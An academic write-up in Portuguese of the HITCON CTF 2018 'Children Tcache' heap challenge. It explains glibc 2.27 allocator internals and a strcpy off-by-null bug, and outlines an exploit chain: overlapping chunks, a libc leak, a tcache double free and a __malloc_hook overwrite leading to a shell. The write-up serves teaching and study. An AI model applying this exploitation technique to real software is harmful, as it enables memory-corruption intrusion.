# HITCON CTF 2018 - Children Tcache (Pwn)

Write-up e reprodução do desafio **Children Tcache**, categoria Pwn do HITCON CTF 2018, desenvolvido como avaliação da disciplina **Segurança Cibernética (CCO-04.2.01)** - PPGCC, UFSCar.

## Membros do grupo

- Bruno Camargo Ribeiro
- Bruno Hiroki Nagao Anhaia
- Cilene Renata Real
- Emerson Hermann Lira dos Santos
- Gabriel Alves Moreira
- Jonathan Choy Rivera
- Stephanie Maria Braga
- Thayná Marostica Machado da Silva

## Introdução

Este documento é um **write-up** do desafio *Children Tcache*. Ele registra a análise do binário entregue, a construção e a execução do exploit, as evidências obtidas em cada etapa da cadeia de exploração.

O **Children Tcache** é um desafio de pwn com a descrição `Try more tcache :)`. O alvo é um alocador fictício com menu — `New`, `Show`, `Delete`, `Exit` —, dez slots e limite de `0x2000` bytes por alocação.

A falha está na combinação de uma leitura limitada com uma cópia sem limite: `read(0, buf, size)` seguido de `strcpy(dest, buf)`. Quando a entrada ocupa exatamente `size` bytes, o terminador NUL escrito pelo `strcpy` cai um byte além da área útil do chunk. Esse único `0x00` é suficiente para encolher o `size` do chunk vizinho e limpar `PREV_INUSE`.

O que torna o desafio um bom estudo de heap é o que vem depois. O `delete` preenche o chunk com `0xda` antes de liberar, impedindo a forja clássica de `prev_size`; a saída é o caminho de split do `last_remainder`, que não chama `unlink`. Com ele, o exploit consolida `A + B`, cria uma sobreposição com um chunk ainda alocado, vaza `main_arena` pelo *unsorted bin*, faz *double free* no `tcache` (a `glibc 2.27` ainda não tem o campo `key`), envenena `__malloc_hook` e desvia a execução para um *one gadget*.

A reprodução documentada neste trabalho fixa a versão da `glibc 2.27` fornecida no handout (`libc.so.6` e `ld-2.27.so`). A versão principal dispensa dependências externas: os scripts utilizam exclusivamente a biblioteca padrão do Python, e a inspeção da heap é feita lendo diretamente `/proc/<pid>/mem`.

---

## 1. Identificação do desafio e objetivo

### 1.1 Interface do programa

O binário apresenta no terminal um menu interativo clássico de desafios de *heap exploitation* ("alocador de notas"), permitindo gerenciar até **10 blocos de memória (slots `0` a `9`)**:

```
$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊    Children Tcache    🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. New heap           $
$   2. Show heap          $
$   3. Delete heap        $
$   4. Exit               $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice:
```

Na prática, o programa mantém na sua memória global dois vetores de 10 posições: um vetor de ponteiros `heap_list[10]` (onde guarda o endereço de cada bloco alocado) e um vetor de tamanhos `size_list[10]`. As quatro opções fazem o seguinte:

- **1. New heap**: procura o primeiro índice livre (de `0` a `9`), pede `Size:` (até `0x2000` bytes), aloca memória com `malloc(size)`, pede `Data:` para o usuário digitar o conteúdo em um buffer temporário na pilha (*stack*) e copia essa entrada para o bloco recém-alocado usando `strcpy`.
- **2. Show heap**: pede `Index:` (`0` a `9`) e, se o slot contiver um ponteiro não-nulo, imprime o conteúdo apontado como texto usando `puts`; se o slot estiver vazio, não imprime nada. Índice maior que `9` encerra com `exit(-3)`.
- **3. Delete heap**: pede `Index:`, sobrescreve todo o conteúdo útil do bloco com o byte `0xda` (`memset(ptr, 0xda, size)`), devolve o bloco ao sistema com `free(ptr)` e finalmente zera o ponteiro e o tamanho na tabela global (`heap_list[idx] = NULL` e `size_list[idx] = 0`). Se o slot estiver vazio, imprime `:)`; índice maior que `9` encerra com `exit(-3)`.
- **4. Exit**: encerra o programa imediatamente com `_exit(0)`.
- O processo também instala um temporizador de 60 segundos (`alarm(60)`), e quando o tempo esgota, o sinal `SIGALRM` imprime `Timeout` e encerra o processo. A cadeia de exploração precisa terminar dentro dessa janela.

### 1.2 Superfície de proteção do binário

Antes de atacar qualquer programa em Linux, verificamos quais defesas de compilação estão ativas nele. Todas as mitigações modernas estão ligadas:

| Propriedade | Valor | Evidência | Impacto na Exploração |
|---|---|---|---|
| Arquitetura | amd64, PIE | `Type: DYN` + `INTERP` | Endereços base do executável e das variáveis globais aleatorizados; inviabiliza referências absolutas sem vazamento prévio (*leak*). |
| RELRO | Full RELRO | `GNU_RELRO` + `FLAGS: BIND_NOW` | GOT resolvida na inicialização e marcada como somente leitura; impede o sequestro de ponteiros de funções externas. |
| Canary | Presente | leitura/checagem de `fs:0x28` em todas as funções | Proteção contra corrupção linear na pilha; inviabiliza sobrescrita de endereço de retorno via *stack overflow*. |
| NX | Habilitado | `GNU_STACK ... RW` | Pilha e heap sem permissão de execução; impede injeção e execução direta de *shellcode*. |
| FORTIFY | Parcial | importa `__read_chk` e `strcpy` **não** é `__strcpy_chk` | Proteção parcial de buffer: a leitura via `__read_chk` é restrita ao tamanho, mas a cópia subsequente com `strcpy` não valida o limite do destino. |
| Símbolos | Removidos (*stripped*) | sem `.symtab` | Tabela de símbolos removida; funções e estruturas precisam ser inferidas via engenharia reversa do código de máquina. |

O binário também importa `atoll` (para converter texto em números inteiros), `memset` (limpeza no delete) e `strcpy` (a cópia vulnerável). O uso de `strcpy` é o ponto central do desafio: o `__read_chk` limita quantos bytes são **lidos do teclado**, mas o `strcpy` sempre adiciona um byte nulo (`\x00`) ao final do texto copiado.

### 1.3 Objetivo e resultado

O objetivo do desafio é obter execução arbitrária de comandos (`/bin/sh`) no contexto do processo e recuperar a flag contida no arquivo `flag` do alvo.

Com todas as proteções ativas (Full RELRO, PIE, NX e Stack Canary), o vetor de ataque apoia-se em peculiaridades do alocador da `glibc 2.27`:
1. Induzir um **off-by-null** (1 byte nulo) para adulterar metadados de chunk, limpando o bit `PREV_INUSE` e forçando uma consolidação indevida que gera **blocos sobrepostos** (*overlapping chunks*).
2. Utilizar essa sobreposição junto à operação `Show heap` como canal de **vazamento de ponteiros da `libc`** (*info leak*) a partir do *unsorted bin*, derrotando o ASLR.
3. Explorar a ausência de checagens de integridade contra *double free* no `tcache` da `glibc 2.27` (*tcache dup*) para direcionar uma alocação arbitrária sobre a variável `__malloc_hook` e sobrescrevê-la com o endereço de um *one gadget*.

**Resultado deste write-up:** shell obtida e flag histórica lida (reprodução local estável, 5/5 execuções; valor e saída completos na Seção 7.5, código em [`solver/exploit.py`](./solver/exploit.py)).

---

## 2. Conceitos Teóricos: Gerenciamento de Memória Dinâmica na glibc 2.27

Esta seção estabelece os fundamentos teóricos sobre a organização da memória e a arquitetura do alocador `ptmalloc2` (implementado na `glibc 2.27`), estritamente necessários para compreender as primitivas exploradas no desafio. São abordados: a representação interna de chunks em memória, as listas de blocos livres (*bins*), as regras de consolidação e split, e a ausência de certas mitigações de integridade que viabilizam a cadeia de ataque descrita nas Seções 6 e 7.

### 2.1 Modelo de Memória e o Alocador ptmalloc2

Durante a execução de um programa em ambiente Linux, o gerenciamento de dados dinâmicos divide-se primordialmente entre dois segmentos de memória:
- **Pilha (*Stack*):** Estrutura LIFO gerenciada pelo processador através do ponteiro de pilha (`rsp` em x86-64), destinada a variáveis locais, contexto de chamadas e endereços de retorno com tempo de vida restrito ao escopo de cada função.
- **Heap:** Segmento contíguo de memória utilizado para alocações dinâmicas cujas dimensões ou ciclos de vida não são determinados em tempo de compilação.

Para evitar o custo de desempenho associado a frequentes chamadas de sistema (`brk` ou `mmap`) a cada solicitação de memória, a biblioteca padrão C (`glibc`) incorpora um alocador interno denominado `ptmalloc2`. O alocador requisita grandes blocos contíguos ao núcleo do sistema operacional (denominados *arenas*) e administra subdivisões menores desses blocos de forma otimizada para atender às chamadas `malloc()`, `free()`, `realloc()` e `calloc()`.

### 2.2 Estrutura Interna de Chunks e Metadados (malloc_chunk)

No `ptmalloc2`, cada bloco de memória alocado ou livre é representado pela estrutura `malloc_chunk`. Um princípio central de design do alocador é o armazenamento *in-band* de metadados: as informações administrativas do bloco residem no próprio segmento de memória, imediatamente anteriores aos dados úteis acessíveis ao programa.

Em arquiteturas de 64 bits, os cabeçalhos de chunk possuem alinhamento de 16 bytes (`0x10`), sendo compostos por dois campos principais de 8 bytes:

```
Endereço mais baixo                                      Endereço mais alto
┌──────────────────┬──────────────────┬───────────────────────────────────┐
│    prev_size     │       size       │     Área de dados do usuário      │
│    (8 bytes)     │    (8 bytes)     │    (onde o programa escreve)      │
└──────────────────┴──────────────────┴───────────────────────────────────┘
▲                                     ▲
│                                     └── ponteiro devolvido pelo malloc()
└── início real do chunk (cabeçalho)
```

1. **`prev_size` (8 bytes):** Quando o chunk fisicamente antecedente na memória está livre, este campo armazena seu tamanho total. Caso o chunk antecedente esteja alocado, este campo permanece inativo para o alocador (sendo aproveitado para dados do usuário, conforme detalhado a seguir).
2. **`size` (8 bytes):** Armazena o tamanho total do chunk atual (incluindo o cabeçalho de 16 bytes). Em arquiteturas de 64 bits, todas as alocações são alinhadas a múltiplos de 16 bytes (`0x10`). Consequentemente, os 3 bits menos significativos do campo `size` permanecem sempre nulos para representar magnitude, sendo reutilizados como *flags* de estado:
   - `A (0x4)` - `NON_MAIN_ARENA`: Indica se o chunk pertence a uma arena secundária associada a uma thread concorrente.
   - `M (0x2)` - `IS_MMAPPED`: Indica se o bloco foi alocado diretamente via chamada `mmap`.
   - `P (0x1)` - `PREV_INUSE`: Flag crítica para a integridade da heap. Quando igual a `1`, indica que o chunk fisicamente anterior está em uso (alocado). Quando igual a `0`, sinaliza que o chunk anterior está livre, habilitando a consolidação retroativa.

Por exemplo, um chunk com valor `size = 0x111` indica:
$$\text{Tamanho total} = \mathtt{0x110}\text{ bytes (272 bytes)} \quad+\quad \text{flag }\mathtt{PREV\_INUSE = 1}\text{ (chunk anterior em uso)}.$$

#### Geometria do Chunk, Reuso de prev_size e Mecanismo do Off-by-Null

Para otimização de espaço, quando um chunk `A` está em uso, o campo `prev_size` do chunk subsequente (`B`) não é necessário para o alocador. A `glibc` permite que os últimos 8 bytes da área útil de `A` ocupem exatamente o espaço reservado ao cabeçalho `prev_size` de `B`.

Quando o programa solicita `malloc(0x108)` (264 bytes de carga útil):
- O cabeçalho requer 16 bytes (`0x10`). O espaço total necessário seria `0x108 + 0x10 = 0x118`, o qual é arredondado para o alinhamento de 16 bytes, resultando em um chunk de `0x110` bytes (pois os 8 bytes finais sobrepõem o `prev_size` do vizinho).
- A chamada `malloc_usable_size` reporta exatamente `0x108` bytes utilizáveis.

```
Chunk A (tamanho total 0x110)                            Chunk B (vizinho)
┌─────────────────┬────────────┬────────────────────────┬────────────────────┬────────────┐
│ A.prev_size     │ A.size     │ Dados de A             │ B.prev_size        │ B.size     │
│ (8 bytes)       │ = 0x111    │ (primeiros 0x100 bytes)│ (últimos 8 bytes   │ = 0x111    │
│                 │            │                        │  de A)             │            │
└─────────────────┴────────────┴────────────────────────┴────────────────────┴────────────┘
                                ▲                                              ▲
                                ptr_A                                           ptr_A+0x108
```

O limite da área útil (`ptr_A + 0x108`) coincide exatamente com o primeiro byte do cabeçalho `B.size`. Na arquitetura x86-64 (*little-endian*), os bytes de menor significância residem nos endereços inferiores. Para o valor de 64 bits `0x0000000000000111` (`B.size`), a disposição na memória é:

```
Endereço:   [B.size + 0] [B.size + 1] [B.size + 2] ... [B.size + 7]
Bytes:          0x11         0x01         0x00     ...     0x00
```

Caso ocorra a escrita de um único byte nulo (`\x00`) imediatamente após o limite da área útil (`ptr_A + 0x108`), o byte `0x11` é sobrescrito por `0x00`. Essa corrupção produz dois efeitos imediatos:
1. **Redução da magnitude:** O alocador passa a interpretar o tamanho de `B` como `0x100` em vez de `0x110`.
2. **Adulteração de metadados:** A flag `PREV_INUSE` é desativada (`0x111` ímpar $\to$ `0x100` par), sinalizando ao alocador que o bloco anterior a `B` encontra-se livre.

Esta mecânica fundamenta o disparo do *off-by-null* analisado na Seção 6.1 e executado no Passo 1 da exploração (Seção 7.1).

### 2.3 Estruturas de Chunks Livres (Bins)

Ao invocar `free(ptr)`, o alocador preserva o chunk em listas encadeadas denominadas *bins*, segregadas por tamanho para permitir reciclagem eficiente em requisições posteriores. Em chunks livres, a área anteriormente destinada aos dados do usuário é reaproveitada para armazenar ponteiros de encadeamento (`fd`, `bk`, `next`).

Três estruturas são diretamente manipuladas neste desafio:

#### 1. tcache (Thread-Local Cache)
Introduzido na `glibc 2.26` para otimizar alocações mono-thread sem contenção de travas (*locks*).
- Atende a requisições de tamanhos entre `0x20` e `0x410` bytes (intervalos de 16 bytes).
- Cada entrada do `tcache` organiza até **7 chunks livres** em uma lista simplesmente encadeada orientada a LIFO.
- O campo `next` de cada chunk livre aponta para o elemento antecedente da lista.
- Quando o limite de 7 entradas de uma dada faixa é atingido, liberações adicionais são encaminhadas aos mecanismos tradicionais da heap (como o *unsorted bin*).
- **Implicação de segurança:** Na `glibc 2.27`, o `tcache` não possui mecanismos de integridade contra *double free* (o campo `key` só foi adicionado na versão 2.29), permitindo envenenamento de lista (*tcache poisoning*) conforme explorado no Passo 4 (Seção 7.4).

#### 2. Unsorted Bin
Fila geral de triagem de chunks livres maiores que o tcache ou liberados após o tcache estar saturado.
- Estruturado como uma **lista circular duplamente encadeada**.
- Utiliza dois ponteiros no início da área útil: `fd` (*forward pointer*) e `bk` (*backward pointer*).
- A cabeça da lista reside em uma estrutura global interna da biblioteca C denominada `main_arena`.
- **Implicação de segurança:** Quando há apenas um chunk no *unsorted bin*, seus ponteiros `fd` e `bk` apontam diretamente para o endereço de `main_arena` dentro da biblioteca `libc.so.6`. A leitura desse ponteiro permite derivar o endereço base da biblioteca em tempo de execução, anulando o ASLR (Passo 3 / Seção 7.3).

```
          ┌───────────────────────────────┐
          │   libc.so.6 (main_arena)      │
          │   cabeça do unsorted bin      │
          └──────▲─────────────────┬──────┘
                 │ fd              │ bk
                 │                 ▼
          ┌──────┴─────────────────┴──────┐
          │ Chunk livre na Heap           │
          │ [header 16B] [fd 8B] [bk 8B]  │
          └───────────────────────────────┘
```

A partir do ponteiro lido (`main_arena + 0x60`), subtrai-se o deslocamento fixo da versão (`0x3ebca0`) para calcular a base da `libc`.

#### 3. Top Chunk (Wilderness)
Região contígua de memória não subdividida situada no limite superior da heap. Quando nenhuma lista de chunks livres pode atender a uma requisição, o alocador recorta o bloco necessário diretamente do início do *top chunk*, atualizando sua posição base. Da mesma forma, quando um chunk livre faz fronteira com o *top chunk*, ele é imediatamente coalescido a este.

### 2.4 Consolidação de Chunks, Macro unlink e Split de last_remainder

Para mitigar a fragmentação externa de memória, a rotina `free()` realiza a consolidação (*coalescing*) de blocos adjacentes fisicamente contíguos sempre que possível:
1. **Consolidação progressiva (*Forward Consolidation*):** Avalia se o chunk posterior (`chunk + size`) está livre. Em caso positivo, funde os dois blocos em um único elemento. Caso faça fronteira com o *top chunk*, a região é absorvida pelo *top chunk*.
2. **Consolidação retroativa (*Backward Consolidation*):** Avalia a flag `PREV_INUSE` do chunk atual. Caso `PREV_INUSE == 0`, o alocador infere que o chunk predecessor imediato em memória está livre e calcula seu endereço base subtraindo `prev_size` do cabeçalho atual:
   $$\text{Endereço do predecessor} = \text{Endereço atual} - \mathtt{prev\_size}$$

#### Checagem de Consistência na Macro unlink
Quando a consolidação requer a remoção de um chunk livre de uma lista duplamente encadeada (como o *unsorted bin*), a macro `unlink` é invocada. A `glibc` executa uma validação de integridade cruzada:
$$\mathtt{chunksize(p) == prev\_size(next\_chunk(p))}$$
Caso o tamanho declarado no cabeçalho do chunk não coincida rigorosamente com o `prev_size` anotado no chunk posterior, o processo é abortado imediatamente com erro fatal (`corrupted size vs. prev_size`).

#### Divisão de last_remainder sem unlink
Quando uma alocação do tipo *small bin* é satisfeita fatiando um chunk maior presente no *unsorted bin*, o remanescente dessa divisão permanece no *unsorted bin* e é referenciado internamente pelo ponteiro `av->last_remainder`.

Na implementação da `glibc 2.27`, se uma requisição subsequente puder ser atendida fatiando o `last_remainder`, a rotina `_int_malloc` utiliza um caminho de execução otimizado que **não invoca a macro `unlink`**. O alocador lê o campo `size` do remanescente (mesmo que adulterado por um *off-by-null*), recorta o bloco solicitado e ajusta o restante sem acionar as validações estritas de `prev_size`. Esse comportamento é a chave que viabiliza a criação de chunks sobrepostos no Passo 2 da exploração (Seção 7.2) e justifica a referência ao `last_remainder` no nome do desafio.

---

## 3. Tema e justificativa acadêmica

**Tema:** heap: *off-by-null*, consolidação e chunks sobrepostos (*overlapping chunks*).

O desafio não se resolve apenas envenenando diretamente o ponteiro `fd` do `tcache` (técnica introdutória vista em aula quando há *Use-After-Free* direto). No `children_tcache`, o programa zera os ponteiros na tabela global após cada `delete` (não há *Use-After-Free* trivial) e ainda sobrescreve todo o chunk com `0xda` antes do `free`. Por isso, é preciso construir a primitiva de *Use-After-Free* / *Overlapping Chunks* a partir de um único byte nulo extra:
1. **Corromper um metadado de chunk** (o byte menos significativo do campo `size`).
2. **Contornar a limpeza com `0xda`** usando consolidação prévia (`free(B)` + `free(A)`) e divisão via `last_remainder`.
3. **Induzir uma consolidação retroativa (*backward consolidation*)** que move o `top chunk` para cima de um bloco que ainda está alocado no menu.
4. Só então usar a região sobreposta para **vazar um endereço da `libc`** e montar o **double free no `tcache`** (*tcache dup*) para sobrescrever `__malloc_hook`.

---

## 4. Por que a técnica depende da `glibc 2.27`

Este write-up fixa a execução em **glibc 2.27 (Ubuntu 2.27-3ubuntu1)**. Em exploração de heap, a versão exata da biblioteca padrão C define as regras do jogo: cada etapa do nosso exploit se apoia em comportamentos reais do alocador de 2018 que receberam mitigações adicionais nos anos seguintes.

| Recurso / Mecanismo | Como funciona na `glibc 2.27` | O que mudou nas versões posteriores |
|---|---|---|
| **`tcache`** | Introduzido na 2.26, guarda até 7 chunks por bin, **sem campo `key`** | Na **2.29**, foi adicionado um segundo ponteiro (`key`) em cada chunk do tcache para detectar e abortar *double free* imediato |
| **`safe-linking`** | **Inexistente** (os ponteiros `next`/`fd` no tcache são gravados em texto claro) | Na **2.32**, os ponteiros simples são ofuscados com XOR usando o endereço da própria heap (`(pos >> 12) ^ ptr`), exigindo um *heap leak* prévio |
| **`__malloc_hook` / `__free_hook`** | **Presentes e chamados** automaticamente por `malloc()`/`free()` se não forem `NULL` | **Removidos na 2.34** justamente por serem o alvo favorito de escrita arbitrária em CTFs e exploits reais |
| **Checagem no `unlink`** | `corrupted size vs. prev_size` ativa no `unlink`, mas **ausente no split de `last_remainder`** | Versões posteriores adicionaram validações extras de tamanho vs. `prev_size` também durante divisões no *unsorted bin* |

Consequências diretas para o desafio:

1. **`tcache` sem `key`:** na `glibc 2.27`, a estrutura `tcache_entry` possui apenas um campo (`struct tcache_entry *next`). Se tivermos dois slots do menu apontando para o mesmo chunk (graças à nossa sobreposição) e chamarmos `Delete` nos dois, o alocador insere o mesmo chunk duas vezes seguidas na lista do `tcache`, criando um ciclo (`chunk -> chunk`).
2. **`__malloc_hook` ainda existe:** dentro da `libc`, antes de executar a lógica normal do `malloc(size)`, a função checa se a variável global `__malloc_hook` é diferente de zero. Se for, ela chama `(*__malloc_hook)(size, caller)`. Assim, transformar uma escrita arbitrária em execução de código exige apenas escrever 8 bytes em `__malloc_hook`.
3. **Caminho de split do `last_remainder`:** quando o `last_remainder` é dividido em dois para atender um pedido menor, a `glibc 2.27` não valida se o campo `size` atual do `last_remainder` concorda com o `prev_size` do chunk seguinte. Isso permite que o tamanho reduzido pelo nosso *off-by-null* (`0x111` $\to$ `0x100`) seja aceito sem abortar o processo.
4. **Sem `safe-linking`:** podemos escrever o endereço de `__malloc_hook` diretamente no ponteiro `next` do chunk no `tcache`, sem precisar vazar antes o endereço da heap para calcular uma máscara XOR.
5. **Capacidade fixa de 7 entradas no `tcache`:** como cada tamanho de `tcache` comporta exatamente 7 blocos livres, sabemos que precisamos alocar e liberar 7 blocos "enchedores" (*fillers*) sempre que quisermos que o 8º `free` vá para o *unsorted bin* (onde ocorrem consolidações e onde aparecem ponteiros da `libc`).

---

## 5. Ambiente de reprodução

O diretório [`challenge/`](./challenge) contém **somente o handout original** e o *dynamic loader* correspondente da `glibc 2.27` necessário para executá-lo de forma isolada em qualquer distribuição Linux moderna:

| Arquivo | Origem | SHA-256 |
|---|---|---|
| [`children_tcache`](./challenge/children_tcache) | handout original (idêntico ao arquivo do pwn.college) | `eeee02e20749370dda1d70bbed6144eb93f89ea2835f966d872474aa32246a8e` |
| [`libc.so.6`](./challenge/libc.so.6) | handout original (Ubuntu GLIBC 2.27-3ubuntu1) | `cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d` |
| [`ld-2.27.so`](./challenge/ld-2.27.so) | extraído de `libc6_2.27-3ubuntu1_amd64.deb` (mesmo build da libc acima) | `2d196bc8632e500316fa0e0c3e8f40d0e7da853ae940805080b3492ce03b7b51` |

O uso do loader [`ld-2.27.so`](./challenge/ld-2.27.so) é obrigatório: o carregador dinâmico (`ld.so`) e a `libc.so.6` compartilham estruturas privadas internas. Tentar carregar a `libc 2.27` usando o loader nativo de um sistema atual (como `glibc 2.41`) aborta na inicialização com:

```
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37:
_dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

Por isso, o script [`run.sh`](./run.sh) invoca diretamente o `ld-2.27.so` passando `--library-path .`.

### 5.1 Passo a passo para rodar o programa e reproduzir o ataque

Não é necessário instalar nenhuma biblioteca externa (como `pwntools` ou Docker): os scripts usam apenas **Python 3 padrão** em Linux `x86_64`, e a `glibc 2.27` já está incluída em `challenge/`.

#### Passo 1 - Verificar a integridade dos arquivos
Na raiz do repositório, confira se os binários (`children_tcache`, `libc.so.6` e `ld-2.27.so`) estão íntegros e com permissão de execução:

```bash
chmod +x run.sh challenge/children_tcache challenge/ld-2.27.so
(cd challenge && sha256sum -c SHA256SUMS)
```

Saída esperada:
```text
children_tcache: OK
libc.so.6: OK
ld-2.27.so: OK
```

#### Passo 2 - Rodar o binário manualmente (modo interativo)
Para interagir no terminal com o menu do desafio (`New` / `Show` / `Delete` / `Exit`) usando a `glibc 2.27` do handout:

```bash
./run.sh
# (ou diretamente: cd challenge && ./ld-2.27.so --library-path . ./children_tcache)
```

Você verá o menu e poderá testar as opções digitando `1`, `2`, `3` ou `4`.

#### Passo 3 - Rodar a sonda de inspeção de memória (`probe.py`)
Para ver na prática o *off-by-null* alterando o cabeçalho do chunk vizinho de `0x111` para `0x100` (lendo diretamente `/proc/<pid>/mem`, sem precisar abrir o `gdb`), execute:

```bash
python3 solver/probe.py
```

#### Passo 4 - Rodar o exploit completo (`exploit.py`) e capturar a flag
Antes de executar, crie o arquivo `flag` na raiz do repositório com o valor histórico publicado nos write-ups de referência (Seção 11); ele não é versionado. O exploit executa toda a cadeia (off-by-null $\to$ consolidação $\to$ leak da `libc` $\to$ `tcache dup` em `__malloc_hook` $\to$ `one_gadget` $\to$ leitura do arquivo `flag`):

```bash
python3 solver/exploit.py
```

A saída esperada (leak, `__malloc_hook` e flag) é a mesma mostrada na Seção 7.5.

### 5.2 Estado da reprodução e verificação experimental

| Etapa | Estado |
|---|---|
| Handout preservado e verificado por hash | concluído |
| Execução fixada em glibc 2.27 (loader + libc do handout) | concluído |
| Off-by-null corrompendo o `size` do chunk seguinte | reproduzido ([`solver/probe.py`](./solver/probe.py)) |
| Consolidação e sobreposição (`top` $\times$ `b2`) | reproduzido |
| Leak de libc pelo *unsorted bin* | reproduzido |
| Shell via `tcache dup` + `__malloc_hook` + *one gadget* | concluído (5/5 execuções) |
| Flag lida do arquivo local `flag` (não versionado) | `hitcon{...}` (valor omitido) |

O script [`solver/probe.py`](./solver/probe.py) foi escrito sem dependências externas (nem mesmo `pwntools`): ele conversa com o processo por *pipes* do Python e inspeciona a memória real da heap lendo diretamente `/proc/<pid>/mem`. Isso permite observar os cabeçalhos dos chunks antes e depois do *off-by-null*:

```
$ python3 solver/probe.py
A (user)     = 0x55556d308dc0
A prev/size  = 0x0 / 0x111
B prev/size  = 0x0 / 0x111  (antes do free)
A size       = 0x111
B prev/size  = 0x4141414141414141 / 0x100  (apos off-by-null)
esperado: size 0x100 (0x111 & ~0xff) com PREV_INUSE limpo
```

As duas últimas linhas evidenciam o resultado: após a escrita de `0x108` bytes `'A'` (`0x41`) em `A`, os últimos 8 bytes preencheram o `prev_size` de `B` com `0x4141414141414141`, e o terminador nulo (`\x00`) inserido por `strcpy` sobrescreveu o byte menos significativo de `B.size`, reduzindo-o de `0x111` para `0x100`.

---

## 6. Engenharia Reversa do Binário e Identificação de Vulnerabilidades

A tabela de símbolos do executável `./challenge/children_tcache` foi removida (*stripped*). Os limites operacionais, estruturas de dados e contratos de cada função foram inferidos a partir da desmontagem da seção `.text` com `objdump -d -M intel challenge/children_tcache`:

- **De onde vêm os 10 slots (`0` a `9`)?**
  - Na função `new_heap` (offset `0xcb7`), um contador `i` (armazenado no operando de memória `[rbp-0x2034]`, um inteiro de 32 bits em formato little-endian com sinal) começa em `0` (`0xcf5`), procura uma posição nula no vetor global `heap_list` em `0x202060` (`[rax*8 + 0x202060]`) e no final do laço (`0xe15..0xe23`) incrementa `i` e executa `cmp DWORD PTR [rbp-0x2034], 0x9` seguido de `jle d04` (*Jump if Less or Equal*, salto condicional com sinal). Ou seja, o laço percorre `i = 0, 1, ..., 9` (**10 posições**). Se todas estiverem ocupadas, imprime `":("`.
  - Nas funções `show_heap` (offset `0xe4b`) e `delete_heap` (offset `0xec9`), o índice lido do usuário é validado em `0xe7a` e `0xef8` com `cmp QWORD PTR [rbp-0x8], 0x9` seguido de `jbe` (*Jump if Below or Equal*, comparação sem sinal `0 <= idx <= 9`). Qualquer índice maior que `9` (ou negativo, já que em representação em complemento de dois um número negativo com sinal vira um número gigante sem sinal) encerra o programa com `exit(-3)`.
  - Os ponteiros alocados são salvos no vetor global `heap_list` (em `.bss` `0x202060`) e os tamanhos correspondentes no vetor `size_list` (em `.bss` `0x2020c0`).
- **De onde vem o limite de tamanho `0x2000`?**
  - Em `0xd4a`, logo após ler o tamanho em `new_heap`, o binário executa `cmp QWORD PTR [rbp-0x2028], 0x2000` e `jbe d61`, de modo que, se o valor passar de `0x2000` (8192 bytes), ele chama `exit(-2)`.

A partir dessa desmontagem, podemos reconstruir em C equivalente o que fazem as funções principais do menu.

### 6.1 O bug de *Off-by-Null* em `new_heap` (Opção 1)

O fluxo da função que cria um novo bloco é equivalente ao seguinte código em C:

```c
void new_heap(void) {
    char stack_buf[0x2010];
    memset(stack_buf, 0, 0x2010);

    for (int i = 0; i <= 9; i++) {
        if (heap_list[i] == NULL) {
            printf("Size:");
            unsigned long size = get_num();      // lê até 16 bytes e chama atoll()
            if (size > 0x2000) exit(-2);

            char *dest = (char *)malloc(size);
            if (!dest) exit(-1);

            printf("Data:");
            get_str(stack_buf, size);            // lê até `size` bytes na stack
            strcpy(dest, stack_buf);             // <-- Vulnerabilidade: cópia sem limite de tamanho

            heap_list[i] = dest;
            size_list[i] = size;
            return;
        }
    }
    puts(":(");
}
```

O mecanismo de vulnerabilidade decorre da interação entre `get_str(stack_buf, size)` e `strcpy(dest, stack_buf)`:

1. **Leitura com `get_str(stack_buf, size)`:** A rotina lê até `size` bytes de `stdin` e os armazena em `stack_buf` (previamente zerado via `memset(stack_buf, 0, 0x2010)`). Se o último caractere for `\n`, ele é substituído por `\0`. Caso sejam enviados exatamente `size` bytes sem caractere de quebra de linha (`\n`), o buffer conterá os `size` bytes seguidos pelo terminador nulo residual na posição `stack_buf[size]`.
2. **Cópia com `strcpy(dest, stack_buf)`:** A função copia sequencialmente os dados até encontrar o terminador nulo, transcrevendo também o byte `\0` para o destino `dest`.
3. **Sobrecarga de 1 byte nulo (*off-by-null*):** Para uma alocação de `size = 0x108`, o envio de `0x108` bytes preenche a carga útil em `dest[0 ... 0x107]` e força a escrita do terminador nulo em `dest[0x108]`, transbordando em exatamente um byte a área útil reportada pelo alocador.

Como vimos na Seção 2.2, quando `size` termina em `8` em hexadecimal (ex.: `0x108`), os dados do usuário ocupam até o último byte antes do campo `size` do chunk seguinte. Com isso, `dest[0x108]` é o byte menos significativo do cabeçalho `size` do próximo chunk na memória.


### 6.2 Sanitização de Chunks com 0xda em delete_heap e Estratégia de Contorno

A implementação de `delete_heap` apresenta uma particularidade defensiva:

```c
void delete_heap(void) {
    printf("Index:");
    unsigned long idx = get_num();
    if (idx > 9) exit(-3);

    if (heap_list[idx] != NULL) {
        // Sanitização: sobrescreve todo o chunk com 0xda antes do free
        memset(heap_list[idx], 0xda, size_list[idx]);
        free(heap_list[idx]);
        heap_list[idx] = NULL;
        size_list[idx] = 0;
    } else {
        puts(":)");
    }
}
```

Em técnicas clássicas de *off-by-null* (como variantes de *House of Einherjar* ou consolidação retroativa forçada), o atacante costuma limpar `PREV_INUSE` do chunk `C` e escrever um valor forjado de `C.prev_size` nos últimos 8 bytes do chunk intermediário `B`.

No `children_tcache`, qualquer tentativa de forjar `prev_size` em `B` é inviabilizada porque `memset(heap_list[idx], 0xda, size_list[idx])` é executado imediatamente antes de `free()`, sobrescrevendo o payload com `0xda`. Como não há operação de edição (`Edit`) no menu, não é possível reescrever em um chunk após sua alocação inicial.

#### Preservação de prev_size Legítimo via Consolidação Prévia
Para contornar a sanitização sem forjar `prev_size` manualmente, a estratégia induz o próprio alocador da `glibc` a gravar um `C.prev_size` válido:

1. Alocam-se três chunks contíguos de `0x110` bytes: `A`, `B` e `C`.
2. Com o `tcache` previamente saturado, efetua-se a liberação de `B`. O `free(B)` insere `B` no *unsorted bin*, atualizando legitimamente `C.prev_size = 0x110` e limpando a flag `PREV_INUSE` de `C`.
3. A liberação subsequente de `A` consolida `A` e `B` em um único bloco de `0x220` bytes no *unsorted bin*.
4. Uma requisição de `malloc(0x108)` reextrai `A` e deixa o restante de `0x110` bytes como `last_remainder` na posição de `B`, regravando `C.prev_size = 0x110` e mantendo `C.PREV_INUSE = 0`.
